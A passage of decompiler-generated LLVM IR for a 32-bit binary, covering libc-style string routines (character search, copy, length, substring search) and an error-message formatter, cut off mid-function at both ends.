  %v4_8051475 = ptrtoint i8* %arg1 to i32
  %v2_805147d = mul i32 %arg2, 256
  %v3_805147d = and i32 %v2_805147d, 65280
  %v4_805147d = and i32 %arg2, -65281
  %v5_805147d = or i32 %v3_805147d, %v4_805147d
  %v8_805147f.pre = load i1, i1* @df, align 1
  %v9_805147f = select i1 %v8_805147f.pre, i32 -1, i32 1
  br label %dec_label_pc_805147f

dec_label_pc_805147f:                             ; preds = %dec_label_pc_8051484, %dec_label_pc_8051474
  %v4_805147f = phi i32 [ %v6_805147f, %dec_label_pc_8051484 ], [ %v5_805147d, %dec_label_pc_8051474 ]
  %v7_805147f = phi i32 [ %v10_805147f, %dec_label_pc_8051484 ], [ %v4_8051475, %dec_label_pc_8051474 ]
  %v1_805147f = inttoptr i32 %v7_805147f to i8*
  %v2_805147f = load i8, i8* %v1_805147f, align 1
  %v10_805147f = add i32 %v7_805147f, %v9_805147f
  %v3_8051480 = udiv i32 %v4_805147f, 256
  %v4_8051480 = trunc i32 %v3_8051480 to i8
  %v16_8051480 = icmp eq i8 %v2_805147f, %v4_8051480
  br i1 %v16_8051480, label %dec_label_pc_805148d.loopexit, label %dec_label_pc_8051484

dec_label_pc_8051484:                             ; preds = %dec_label_pc_805147f
  %v3_805147f = zext i8 %v2_805147f to i32
  %v5_805147f = and i32 %v4_805147f, -256
  %v6_805147f = or i32 %v3_805147f, %v5_805147f
  %v4_8051484 = icmp eq i8 %v2_805147f, 0
  %v1_8051486 = icmp eq i1 %v4_8051484, false
  br i1 %v1_8051486, label %dec_label_pc_805147f, label %dec_label_pc_8051488

dec_label_pc_8051488:                             ; preds = %dec_label_pc_8051484
  br label %dec_label_pc_805148d

dec_label_pc_805148d.loopexit:                    ; preds = %dec_label_pc_805147f
  %phitmp = add i32 %v10_805147f, -1
  br label %dec_label_pc_805148d

dec_label_pc_805148d:                             ; preds = %dec_label_pc_805148d.loopexit, %dec_label_pc_8051488
  %v0_805148d = phi i32 [ 0, %dec_label_pc_8051488 ], [ %phitmp, %dec_label_pc_805148d.loopexit ]
  ret i32 %v0_805148d

; uselistorder directives
  uselistorder i8 %v2_805147f, { 1, 2, 0 }
  uselistorder i32 %v4_805147f, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_8051494(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8051494:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051495 = load i32, i32* @esi, align 4
  store i32 %v0_8051495, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805149d = ptrtoint i8* %arg1 to i32
  store i32 %v4_805149d, i32* %edi.global-to-local, align 4
  %v4_80514a1.pre = load i32, i32* @eax, align 4
  %v8_80514a1.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_80514a1

dec_label_pc_80514a1:                             ; preds = %dec_label_pc_80514a1.dec_label_pc_80514a1_crit_edge, %dec_label_pc_8051494
  %v2_80514a2 = phi i32 [ %v7_80514a2, %dec_label_pc_80514a1.dec_label_pc_80514a1_crit_edge ], [ %v4_805149d, %dec_label_pc_8051494 ]
  %v8_80514a1 = phi i1 [ %v5_80514a2, %dec_label_pc_80514a1.dec_label_pc_80514a1_crit_edge ], [ %v8_80514a1.pre, %dec_label_pc_8051494 ]
  %v4_80514a1 = phi i32 [ %v0_80514a3, %dec_label_pc_80514a1.dec_label_pc_80514a1_crit_edge ], [ %v4_80514a1.pre, %dec_label_pc_8051494 ]
  %v7_80514a1 = phi i32 [ %v0_80514a1.pre, %dec_label_pc_80514a1.dec_label_pc_80514a1_crit_edge ], [ %arg2, %dec_label_pc_8051494 ]
  %v1_80514a1 = inttoptr i32 %v7_80514a1 to i8*
  %v2_80514a1 = load i8, i8* %v1_80514a1, align 1
  %v3_80514a1 = zext i8 %v2_80514a1 to i32
  %v5_80514a1 = and i32 %v4_80514a1, -256
  %v6_80514a1 = or i32 %v3_80514a1, %v5_80514a1
  store i32 %v6_80514a1, i32* %eax.global-to-local, align 4
  %v9_80514a1 = select i1 %v8_80514a1, i32 -1, i32 1
  %v10_80514a1 = add i32 %v7_80514a1, %v9_80514a1
  store i32 %v10_80514a1, i32* %esi.global-to-local, align 4
  %v3_80514a2 = inttoptr i32 %v2_80514a2 to i8*
  store i8 %v2_80514a1, i8* %v3_80514a2, align 1
  %v4_80514a2 = load i32, i32* %edi.global-to-local, align 4
  %v5_80514a2 = load i1, i1* @df, align 1
  %v6_80514a2 = select i1 %v5_80514a2, i32 -1, i32 1
  %v7_80514a2 = add i32 %v6_80514a2, %v4_80514a2
  store i32 %v7_80514a2, i32* %edi.global-to-local, align 4
  %v0_80514a3 = load i32, i32* %eax.global-to-local, align 4
  %v3_80514a3 = trunc i32 %v0_80514a3 to i8
  %v4_80514a3 = icmp eq i8 %v3_80514a3, 0
  %v1_80514a5 = icmp eq i1 %v4_80514a3, false
  br i1 %v1_80514a5, label %dec_label_pc_80514a1.dec_label_pc_80514a1_crit_edge, label %dec_label_pc_80514a7

dec_label_pc_80514a1.dec_label_pc_80514a1_crit_edge: ; preds = %dec_label_pc_80514a1
  %v0_80514a1.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80514a1

dec_label_pc_80514a7:                             ; preds = %dec_label_pc_80514a1
  store i32 %v4_805149d, i32* %eax.global-to-local, align 4
  %v2_80514ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80514ac, i32* %esi.global-to-local, align 4
  ret i32 %v4_805149d

; uselistorder directives
  uselistorder i32 %v0_80514a3, { 1, 0 }
  uselistorder i32 %v7_80514a2, { 1, 0 }
  uselistorder i1 %v5_80514a2, { 1, 0 }
  uselistorder i32 %v4_805149d, { 1, 2, 0, 3 }
}

define i32 @function_80514b0(i8* %arg1) local_unnamed_addr {
dec_label_pc_80514b0:
  %v0_80514b0 = load i32, i32* @edi, align 4
  %v3_80514ba = call i32 @_strlen(i8* %arg1)
  store i32 %v3_80514ba, i32* @ecx, align 4
  store i32 %v0_80514b0, i32* @edi, align 4
  ret i32 %v3_80514ba
}

define i32 @function_80514c4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80514c4:
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80514c5 = load i32, i32* @esi, align 4
  store i32 %v0_80514c5, i32* %stack_var_-8, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_80514d1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80514d1, i32* %edi.global-to-local, align 4
  %v1_80514d5 = add i32 %arg3, 1
  store i32 %v1_80514d5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80514d6

dec_label_pc_80514d6:                             ; preds = %dec_label_pc_80514d9, %dec_label_pc_80514c4
  %v3_80514da = phi i32 [ %v4_80514d1, %dec_label_pc_80514c4 ], [ %v8_80514da, %dec_label_pc_80514d9 ]
  %v0_80514d6 = phi i32 [ %v1_80514d5, %dec_label_pc_80514c4 ], [ %v0_80514d6.pre, %dec_label_pc_80514d9 ]
  %v1_80514d6 = add i32 %v0_80514d6, -1
  %v8_80514d6 = icmp eq i32 %v1_80514d6, 0
  store i32 %v1_80514d6, i32* %ecx.global-to-local, align 4
  br i1 %v8_80514d6, label %.loopexit, label %dec_label_pc_80514d9

dec_label_pc_80514d9:                             ; preds = %dec_label_pc_80514d6
  %v0_80514d9 = load i32, i32* %esi.global-to-local, align 4
  %v1_80514d9 = inttoptr i32 %v0_80514d9 to i8*
  %v2_80514d9 = load i8, i8* %v1_80514d9, align 1
  %v10_80514d9 = load i1, i1* @df, align 1
  %v11_80514d9 = select i1 %v10_80514d9, i32 -1, i32 1
  %v12_80514d9 = add i32 %v11_80514d9, %v0_80514d9
  store i32 %v12_80514d9, i32* %esi.global-to-local, align 4
  %v4_80514da = inttoptr i32 %v3_80514da to i8*
  store i8 %v2_80514d9, i8* %v4_80514da, align 1
  %v5_80514da = load i32, i32* %edi.global-to-local, align 4
  %v6_80514da = load i1, i1* @df, align 1
  %v7_80514da = select i1 %v6_80514da, i32 -1, i32 1
  %v8_80514da = add i32 %v7_80514da, %v5_80514da
  store i32 %v8_80514da, i32* %edi.global-to-local, align 4
  %v6_80514db = icmp eq i8 %v2_80514d9, 0
  %v1_80514dd = icmp eq i1 %v6_80514db, false
  %v0_80514d6.pre = load i32, i32* %ecx.global-to-local, align 4
  br i1 %v1_80514dd, label %dec_label_pc_80514d6, label %dec_label_pc_80514df

dec_label_pc_80514df:                             ; preds = %dec_label_pc_80514d9
  %v1_80514df = add i32 %v0_80514d6.pre, -1
  store i32 %v1_80514df, i32* %ecx.global-to-local, align 4
  %v2_80514e0 = sext i8 %v2_80514d9 to i32
  %v4_80514e0 = inttoptr i32 %v8_80514da to i8*
  %v5_80514e0 = call i8* @_memset(i8* %v4_80514e0, i32 %v2_80514e0, i32 %v1_80514df)
  %v6_80514e0 = ptrtoint i8* %v5_80514e0 to i32
  store i32 %v6_80514e0, i32* %ecx.global-to-local, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_80514d6, %dec_label_pc_80514df
  %v2_80514e6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80514e6, i32* @edx, align 4
  %v2_80514e7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80514e7, i32* @esi, align 4
  ret i32 %v4_80514d1

; uselistorder directives
  uselistorder i32 %v8_80514da, { 0, 2, 1 }
  uselistorder i8 %v2_80514d9, { 0, 2, 1 }
  uselistorder i32 %v1_80514d6, { 1, 0 }
  uselistorder i32 %v4_80514d1, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %ecx.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %.loopexit, { 1, 0 }
}

define i32 @function_80514ec() local_unnamed_addr {
dec_label_pc_80514ec:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8* @__decompiler_undefined_function_4()
  %v4_80514ec = ptrtoint i8* %tmp4 to i32
  %v8_80514ff5 = icmp eq i32 %tmp, 0
  %v1_80515006 = icmp eq i1 %v8_80514ff5, false
  br i1 %v1_80515006, label %dec_label_pc_80514f9, label %dec_label_pc_8051502

dec_label_pc_80514f9:                             ; preds = %dec_label_pc_80514ec, %dec_label_pc_80514fe
  %v1_80514ff8 = phi i32 [ %v1_80514ff, %dec_label_pc_80514fe ], [ %tmp, %dec_label_pc_80514ec ]
  %v0_80515027 = phi i32 [ %v1_80514fe, %dec_label_pc_80514fe ], [ %v4_80514ec, %dec_label_pc_80514ec ]
  %v1_80514f9 = inttoptr i32 %v0_80515027 to i8*
  %v2_80514f9 = load i8, i8* %v1_80514f9, align 1
  %v3_80514f9 = icmp eq i8 %v2_80514f9, 0
  br i1 %v3_80514f9, label %dec_label_pc_8051502, label %dec_label_pc_80514fe

dec_label_pc_80514fe:                             ; preds = %dec_label_pc_80514f9
  %v1_80514fe = add i32 %v0_80515027, 1
  %v1_80514ff = add i32 %v1_80514ff8, -1
  %v8_80514ff = icmp eq i32 %v1_80514ff, 0
  %v1_8051500 = icmp eq i1 %v8_80514ff, false
  br i1 %v1_8051500, label %dec_label_pc_80514f9, label %dec_label_pc_8051502

dec_label_pc_8051502:                             ; preds = %dec_label_pc_80514fe, %dec_label_pc_80514f9, %dec_label_pc_80514ec
  %v0_8051502.lcssa = phi i32 [ %v4_80514ec, %dec_label_pc_80514ec ], [ %v0_80515027, %dec_label_pc_80514f9 ], [ %v1_80514fe, %dec_label_pc_80514fe ]
  %v2_8051502 = sub i32 %v0_8051502.lcssa, %v4_80514ec
  ret i32 %v2_8051502

; uselistorder directives
  uselistorder i32 %v1_80514ff, { 1, 0 }
  uselistorder i32 %v0_80515027, { 0, 2, 1 }
  uselistorder i32 %v4_80514ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80514f9, { 1, 0 }
}

define i32 @function_8051508(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_8051508:
  %v4_805150f = ptrtoint i8* %arg2 to i32
  %v2_8051517 = load i8, i8* %arg2, align 1
  %v1_805151a = icmp eq i8 %v2_8051517, 0
  br i1 %v1_805151a, label %dec_label_pc_80515c7, label %dec_label_pc_8051522

dec_label_pc_8051522:                             ; preds = %dec_label_pc_8051508
  %v1_8051522 = add i32 %arg1, -1
  br label %dec_label_pc_8051523

dec_label_pc_8051523:                             ; preds = %dec_label_pc_805152f, %dec_label_pc_8051522
  %v0_8051523 = phi i32 [ %v1_8051523, %dec_label_pc_805152f ], [ %v1_8051522, %dec_label_pc_8051522 ]
  %v1_8051523 = add i32 %v0_8051523, 1
  %v1_8051524 = inttoptr i32 %v1_8051523 to i8*
  %v2_8051524 = load i8, i8* %v1_8051524, align 1
  %v1_8051527 = icmp eq i8 %v2_8051524, 0
  br i1 %v1_8051527, label %dec_label_pc_80515c5, label %dec_label_pc_805152f

dec_label_pc_805152f:                             ; preds = %dec_label_pc_8051523
  %v12_805152f = icmp eq i8 %v2_8051524, %v2_8051517
  %v1_8051531 = icmp eq i1 %v12_805152f, false
  br i1 %v1_8051531, label %dec_label_pc_8051523, label %dec_label_pc_8051533

dec_label_pc_8051533:                             ; preds = %dec_label_pc_805152f
  %v1_8051533 = add i32 %v4_805150f, 1
  %v2_805153a = inttoptr i32 %v1_8051533 to i8*
  %v3_805153a = load i8, i8* %v2_805153a, align 1
  %v1_8051541 = icmp eq i8 %v3_805153a, 0
  br i1 %v1_8051541, label %dec_label_pc_80515c7, label %dec_label_pc_8051545

dec_label_pc_8051545:                             ; preds = %dec_label_pc_8051533
  %v1_8051545 = add i32 %v0_8051523, 2
  %v1_8051586 = add i32 %v4_805150f, 2
  %v2_8051586 = inttoptr i32 %v1_8051586 to i8*
  br label %dec_label_pc_8051578

dec_label_pc_8051550:                             ; preds = %dec_label_pc_80515bd
  %v2_8051550 = inttoptr i32 %v0_805158b to i8*
  %v3_8051550 = load i8, i8* %v2_8051550, align 1
  br label %dec_label_pc_805156d.preheader

dec_label_pc_805156d.preheader:                   ; preds = %dec_label_pc_8051550, %dec_label_pc_8051578
  %v0_8051559.ph.in = phi i8 [ %v0_805156d27.in, %dec_label_pc_8051578 ], [ %v3_8051550, %dec_label_pc_8051550 ]
  %v12_805156d53 = icmp eq i8 %v0_8051559.ph.in, %v2_8051517
  %v1_805156f54 = icmp eq i1 %v12_805156d53, false
  br i1 %v1_805156f54, label %dec_label_pc_8051559, label %dec_label_pc_8051571

dec_label_pc_8051559:                             ; preds = %dec_label_pc_805156d.preheader, %dec_label_pc_8051569
  %v0_805155956.in = phi i8 [ %v2_805156a, %dec_label_pc_8051569 ], [ %v0_8051559.ph.in, %dec_label_pc_805156d.preheader ]
  %v0_805155d55 = phi i32 [ %v1_8051569, %dec_label_pc_8051569 ], [ %v0_805158b, %dec_label_pc_805156d.preheader ]
  %v1_8051559 = icmp eq i8 %v0_805155956.in, 0
  br i1 %v1_8051559, label %dec_label_pc_80515c5, label %dec_label_pc_805155d

dec_label_pc_805155d:                             ; preds = %dec_label_pc_8051559
  %v1_805155d = add i32 %v0_805155d55, 1
  %v1_805155e = inttoptr i32 %v1_805155d to i8*
  %v2_805155e = load i8, i8* %v1_805155e, align 1
  %v12_8051561 = icmp eq i8 %v2_805155e, %v2_8051517
  br i1 %v12_8051561, label %dec_label_pc_8051571, label %dec_label_pc_8051565

dec_label_pc_8051565:                             ; preds = %dec_label_pc_805155d
  %v1_8051565 = icmp eq i8 %v2_805155e, 0
  br i1 %v1_8051565, label %dec_label_pc_80515c5, label %dec_label_pc_8051569

dec_label_pc_8051569:                             ; preds = %dec_label_pc_8051565
  %v1_8051569 = add i32 %v0_805155d55, 2
  %v1_805156a = inttoptr i32 %v1_8051569 to i8*
  %v2_805156a = load i8, i8* %v1_805156a, align 1
  %v12_805156d = icmp eq i8 %v2_805156a, %v2_8051517
  %v1_805156f = icmp eq i1 %v12_805156d, false
  br i1 %v1_805156f, label %dec_label_pc_8051559, label %dec_label_pc_8051571

dec_label_pc_8051571:                             ; preds = %dec_label_pc_8051569, %dec_label_pc_805155d, %dec_label_pc_805156d.preheader
  %v0_8051571 = phi i32 [ %v0_805158b, %dec_label_pc_805156d.preheader ], [ %v1_805155d, %dec_label_pc_805155d ], [ %v1_8051569, %dec_label_pc_8051569 ]
  %v1_8051571 = add i32 %v0_8051571, 1
  br label %dec_label_pc_8051578

dec_label_pc_8051578:                             ; preds = %dec_label_pc_8051545, %dec_label_pc_8051571
  %v0_805156d27.in.in.in = phi i32 [ %v1_8051571, %dec_label_pc_8051571 ], [ %v1_8051545, %dec_label_pc_8051545 ]
  %v0_805158b = phi i32 [ %v1_8051571, %dec_label_pc_8051571 ], [ %v1_8051545, %dec_label_pc_8051545 ]
  %v0_805156d27.in.in = inttoptr i32 %v0_805156d27.in.in.in to i8*
  %v0_805156d27.in = load i8, i8* %v0_805156d27.in.in, align 1
  %storemerge4 = icmp eq i8 %v0_805156d27.in, %v3_805153a
  %v1_8051578 = icmp eq i1 %storemerge4, false
  br i1 %v1_8051578, label %dec_label_pc_805156d.preheader, label %dec_label_pc_805157a

dec_label_pc_805157a:                             ; preds = %dec_label_pc_8051578
  %v1_8051582 = add i32 %v0_805158b, 1
  %v2_8051582 = inttoptr i32 %v1_8051582 to i8*
  %v3_8051582 = load i8, i8* %v2_8051582, align 1
  %v3_8051586 = load i8, i8* %v2_8051586, align 1
  %v1_805158e = add i32 %v0_805158b, -1
  %v12_8051591 = icmp eq i8 %v3_8051582, %v3_8051586
  %v1_8051593 = icmp eq i1 %v12_8051591, false
  br i1 %v1_8051593, label %dec_label_pc_80515bd, label %dec_label_pc_8051595.preheader

dec_label_pc_8051595.preheader:                   ; preds = %dec_label_pc_805157a
  %v1_805159510 = icmp eq i8 %v3_8051582, 0
  br i1 %v1_805159510, label %dec_label_pc_80515c7, label %dec_label_pc_8051599

dec_label_pc_8051599:                             ; preds = %dec_label_pc_8051595.preheader, %dec_label_pc_80515b9
  %v0_80515ac = phi i32 [ %v1_80515ac, %dec_label_pc_80515b9 ], [ %v1_8051586, %dec_label_pc_8051595.preheader ]
  %v0_80515a9 = phi i32 [ %v1_80515a9, %dec_label_pc_80515b9 ], [ %v1_8051582, %dec_label_pc_8051595.preheader ]
  %v1_8051599 = add i32 %v0_80515a9, 1
  %v2_8051599 = inttoptr i32 %v1_8051599 to i8*
  %v3_8051599 = load i8, i8* %v2_8051599, align 1
  %v1_805159d = add i32 %v0_80515ac, 1
  %v2_805159d = inttoptr i32 %v1_805159d to i8*
  %v3_805159d = load i8, i8* %v2_805159d, align 1
  %v12_80515a1 = icmp eq i8 %v3_8051599, %v3_805159d
  %v1_80515a3 = icmp eq i1 %v12_80515a1, false
  br i1 %v1_80515a3, label %dec_label_pc_80515bd, label %dec_label_pc_80515a5

dec_label_pc_80515a5:                             ; preds = %dec_label_pc_8051599
  %v1_80515a5 = icmp eq i8 %v3_805159d, 0
  br i1 %v1_80515a5, label %dec_label_pc_80515c7, label %dec_label_pc_80515a9

dec_label_pc_80515a9:                             ; preds = %dec_label_pc_80515a5
  %v1_80515a9 = add i32 %v0_80515a9, 2
  %v1_80515ac = add i32 %v0_80515ac, 2
  %v1_80515af = inttoptr i32 %v1_80515a9 to i8*
  %v2_80515af = load i8, i8* %v1_80515af, align 1
  %v1_80515b2 = inttoptr i32 %v1_80515ac to i8*
  %v2_80515b2 = load i8, i8* %v1_80515b2, align 1
  %v12_80515b5 = icmp eq i8 %v2_80515af, %v2_80515b2
  %v1_80515b7 = icmp eq i1 %v12_80515b5, false
  br i1 %v1_80515b7, label %dec_label_pc_80515bd, label %dec_label_pc_80515b9

dec_label_pc_80515b9:                             ; preds = %dec_label_pc_80515a9
  %v1_8051595 = icmp eq i8 %v2_80515b2, 0
  br i1 %v1_8051595, label %dec_label_pc_80515c7, label %dec_label_pc_8051599

dec_label_pc_80515bd:                             ; preds = %dec_label_pc_80515a9, %dec_label_pc_8051599, %dec_label_pc_805157a
  %v0_80515bd.in = phi i8 [ %v3_8051586, %dec_label_pc_805157a ], [ %v2_80515b2, %dec_label_pc_80515a9 ], [ %v3_805159d, %dec_label_pc_8051599 ]
  %v1_80515bd = icmp eq i8 %v0_80515bd.in, 0
  %v1_80515bf = icmp eq i1 %v1_80515bd, false
  br i1 %v1_80515bf, label %dec_label_pc_8051550, label %dec_label_pc_80515c7

dec_label_pc_80515c5:                             ; preds = %dec_label_pc_8051523, %dec_label_pc_8051565, %dec_label_pc_8051559
  br label %dec_label_pc_80515c7

dec_label_pc_80515c7:                             ; preds = %dec_label_pc_8051595.preheader, %dec_label_pc_80515bd, %dec_label_pc_80515a5, %dec_label_pc_80515b9, %dec_label_pc_8051508, %dec_label_pc_8051533, %dec_label_pc_80515c5
  %storemerge2 = phi i32 [ 0, %dec_label_pc_80515c5 ], [ %v1_8051523, %dec_label_pc_8051533 ], [ %arg1, %dec_label_pc_8051508 ], [ %v1_805158e, %dec_label_pc_80515b9 ], [ %v1_805158e, %dec_label_pc_80515a5 ], [ %v1_805158e, %dec_label_pc_80515bd ], [ %v1_805158e, %dec_label_pc_8051595.preheader ]
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i8 %v2_80515b2, { 0, 2, 1 }
  uselistorder i32 %v1_80515ac, { 1, 0 }
  uselistorder i32 %v1_80515a9, { 1, 0 }
  uselistorder i8 %v3_805159d, { 0, 2, 1 }
  uselistorder i8 %v3_8051582, { 1, 0 }
  uselistorder i32 %v0_805158b, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v1_8051571, { 1, 0 }
  uselistorder i8 %v2_805156a, { 1, 0 }
  uselistorder i32 %v1_8051569, { 0, 2, 1 }
  uselistorder i8 %v2_805155e, { 1, 0 }
  uselistorder i32 %v0_805155d55, { 1, 0 }
  uselistorder i32 %v1_8051545, { 1, 0 }
  uselistorder i32 %v1_8051523, { 0, 2, 1 }
  uselistorder i8 %v2_8051517, { 1, 2, 0, 3, 4 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80515c7, { 6, 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_80515c5, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8051599, { 1, 0 }
  uselistorder label %dec_label_pc_8051578, { 1, 0 }
  uselistorder label %dec_label_pc_8051559, { 1, 0 }
  uselistorder label %dec_label_pc_805156d.preheader, { 1, 0 }
}

define i32 @function_80515d0() local_unnamed_addr {
dec_label_pc_80515d0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp2, i32* @ebx, align 4
  %v3_80515e1 = call i32 @function_80515f0(i32 %tmp, i32 %tmp2, i32 %tmp1)
  %v0_80515e6 = load i32, i32* @ebx, align 4
  ret i32 %v0_80515e6
}

define i32 @function_80515f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80515f0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-17 = alloca i32, align 4
  %stack_var_-108 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  %v6_8051602 = icmp ugt i32 %arg1, 124
  br i1 %v6_8051602, label %dec_label_pc_805161f, label %dec_label_pc_8051604

dec_label_pc_8051604:                             ; preds = %dec_label_pc_80515f0
  store i32 ptrtoint ([8 x i8]* @global_var_805b6a0.320 to i32), i32* @esi, align 4
  %v1_80516144 = icmp eq i32 %arg1, 0
  %v1_805161611 = icmp eq i1 %v1_80516144, false
  br i1 %v1_805161611, label %dec_label_pc_805160d, label %dec_label_pc_8051618

dec_label_pc_805160d:                             ; preds = %dec_label_pc_8051604, %dec_label_pc_805160d
  %v0_8051610 = phi i32 [ %v3_8051610, %dec_label_pc_805160d ], [ %arg1, %dec_label_pc_8051604 ]
  %v0_8051613 = phi i32 [ %v1_8051613, %dec_label_pc_805160d ], [ ptrtoint ([8 x i8]* @global_var_805b6a0.320 to i32), %dec_label_pc_8051604 ]
  %v1_805160d = inttoptr i32 %v0_8051613 to i8*
  %v2_805160d = load i8, i8* %v1_805160d, align 1
  %v7_805160d = icmp eq i8 %v2_805160d, 0
  %v2_8051610 = zext i1 %v7_805160d to i32
  %v3_8051610 = add i32 %v2_8051610, %v0_8051610
  %v16_8051610 = icmp eq i32 %v3_8051610, 0
  %v1_8051613 = add i32 %v0_8051613, 1
  store i32 %v1_8051613, i32* @esi, align 4
  %v1_8051616 = icmp eq i1 %v16_8051610, false
  br i1 %v1_8051616, label %dec_label_pc_805160d, label %dec_label_pc_8051618

dec_label_pc_8051618:                             ; preds = %dec_label_pc_805160d, %dec_label_pc_8051604
  %v0_805161a = phi i32 [ ptrtoint ([8 x i8]* @global_var_805b6a0.320 to i32), %dec_label_pc_8051604 ], [ %v1_8051613, %dec_label_pc_805160d ]
  store i32 0, i32* @ebp, align 4
  %v1_805161a = inttoptr i32 %v0_805161a to i8*
  %v2_805161a = load i8, i8* %v1_805161a, align 1
  %v3_805161a = icmp eq i8 %v2_805161a, 0
  %v1_805161d = icmp eq i1 %v3_805161a, false
  br i1 %v1_805161d, label %dec_label_pc_8051618.dec_label_pc_805164e_crit_edge, label %dec_label_pc_805161f

dec_label_pc_8051618.dec_label_pc_805164e_crit_edge: ; preds = %dec_label_pc_8051618
  br label %dec_label_pc_805164e

dec_label_pc_805161f:                             ; preds = %dec_label_pc_8051618, %dec_label_pc_80515f0
  store i32 22, i32* @ebp, align 4
  %v1_8051627 = ashr i32 %arg1, 31
  store i8* null, i8** %stack_var_-108, align 4
  %v6_8051633 = bitcast i32* %stack_var_-17 to i8*
  %v7_8051633 = call i32 @function_8053f34(i8* %v6_8051633, i32 %arg1, i32 %v1_8051627, i32 -10, i32 0)
  %v1_805163b = add i32 %v7_8051633, -14
  store i32 %v1_805163b, i32* @esi, align 4
  %v5_8051645 = inttoptr i32 %v1_805163b to i8*
  store i8* %v5_8051645, i8** %stack_var_-108, align 4
  %tmp44 = inttoptr i32 %v1_805163b to i16*
  %v6_8051646 = call i32 @function_8051414(i16* %tmp44, i32 ptrtoint ([15 x i8]* @global_var_805b676.321 to i32), i32 14)
  %v0_805165d.pre = load i32, i32* @edi, align 4
  %v0_805165f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805164e

dec_label_pc_805164e:                             ; preds = %dec_label_pc_8051618.dec_label_pc_805164e_crit_edge, %dec_label_pc_805161f
  %v0_805165f = phi i32 [ %v0_805161a, %dec_label_pc_8051618.dec_label_pc_805164e_crit_edge ], [ %v0_805165f.pre, %dec_label_pc_805161f ]
  %v0_805165d = phi i32 [ %arg3, %dec_label_pc_8051618.dec_label_pc_805164e_crit_edge ], [ %v0_805165d.pre, %dec_label_pc_805161f ]
  %v4_8051650 = icmp eq i32 %arg2, 0
  %v1_8051655 = icmp eq i1 %v4_8051650, false
  %v2_805165d = select i1 %v1_8051655, i32 %v0_805165d, i32 0
  store i32 %v2_805165d, i32* @edi, align 4
  %v5_805165f = inttoptr i32 %v0_805165f to i8*
  store i8* %v5_805165f, i8** %stack_var_-108, align 4
  %v3_8051660 = call i32 @function_80514b0(i8* %v5_805165f)
  %v1_8051668 = add i32 %v3_8051660, 1
  store i32 %v1_8051668, i32* %ebx.global-to-local, align 4
  %v1_805166b = load i32, i32* @edi, align 4
  %tmp46 = icmp ugt i32 %v1_8051668, %v1_805166b
  br i1 %tmp46, label %dec_label_pc_805166f, label %dec_label_pc_8051676

dec_label_pc_805166f:                             ; preds = %dec_label_pc_805164e
  store i32 %v1_805166b, i32* %ebx.global-to-local, align 4
  store i32 34, i32* @ebp, align 4
  br label %dec_label_pc_8051676

dec_label_pc_8051676:                             ; preds = %dec_label_pc_805164e, %dec_label_pc_805166f
  %v0_805167b = phi i32 [ %v1_8051668, %dec_label_pc_805164e ], [ %v1_805166b, %dec_label_pc_805166f ]
  %v1_8051676 = icmp eq i32 %v0_805167b, 0
  br i1 %v1_8051676, label %dec_label_pc_8051692, label %dec_label_pc_805167a

dec_label_pc_805167a:                             ; preds = %dec_label_pc_8051676
  %v0_805167c = load i32, i32* @esi, align 4
  %v8_805167d = inttoptr i32 %arg2 to i8*
  store i8* %v8_805167d, i8** %stack_var_-108, align 4
  %tmp45 = inttoptr i32 %arg2 to i16*
  %v6_8051681 = call i32 @function_8051414(i16* %tmp45, i32 %v0_805167c, i32 %v0_805167b)
  %v1_805168d = load i32, i32* %ebx.global-to-local, align 4
  %v2_805168d = add i32 %arg2, -1
  %v3_805168d = add i32 %v2_805168d, %v1_805168d
  %v4_805168d = inttoptr i32 %v3_805168d to i8*
  store i8 0, i8* %v4_805168d, align 1
  br label %dec_label_pc_8051692

dec_label_pc_8051692:                             ; preds = %dec_label_pc_8051676, %dec_label_pc_805167a
  %v0_8051692 = load i32, i32* @ebp, align 4
  %v1_8051692 = icmp eq i32 %v0_8051692, 0
  br i1 %v1_8051692, label %dec_label_pc_805169d, label %dec_label_pc_8051696

dec_label_pc_8051696:                             ; preds = %dec_label_pc_8051692
  %v0_8051696 = load i8*, i8** %stack_var_-108, align 4
  %v1_8051696 = ptrtoint i8* %v0_8051696 to i32
  %v2_8051696 = call i32 @function_8050568(i32 %v1_8051696)
  %v0_805169b = load i32, i32* @ebp, align 4
